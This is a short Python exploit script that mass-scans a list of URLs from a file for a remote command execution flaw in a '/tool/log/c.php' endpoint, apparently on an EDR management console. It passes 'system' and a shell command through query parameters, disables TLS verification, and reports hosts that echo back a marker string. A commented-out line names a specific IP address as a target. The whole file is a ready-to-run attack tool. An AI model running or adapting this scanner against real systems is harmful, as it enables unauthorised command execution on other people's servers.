import requests
import re
from requests.packages import urllib3

urllib3.disable_warnings()

def exploit(url):
    url = url.strip() + "/tool/log/c.php?strip_slashes=system&host=echo%20%22sunian%22"
    # print(url)
    req = requests.get(url,verify=False).text
    # print(req)
    result = (re.findall(r"sunian",req))
    if "sunian" in result:
        print ("[*]"+url+" Go Go GO !")
    # else:
    #     print("jump")

if __name__ == '__main__':

    f = open("EDR.txt")  # 返回一个文件对象
    line = f.readline()  # 调用文件的 readline()方法
    for line in open("EDR.txt"):

        url = line.strip()      # 在 Python 3 中使用
# line = "https://120.132.99.116/"
        try:
            exploit(url)
        except:
            pass

    f.close()
    print("[*]Exploit Finished")

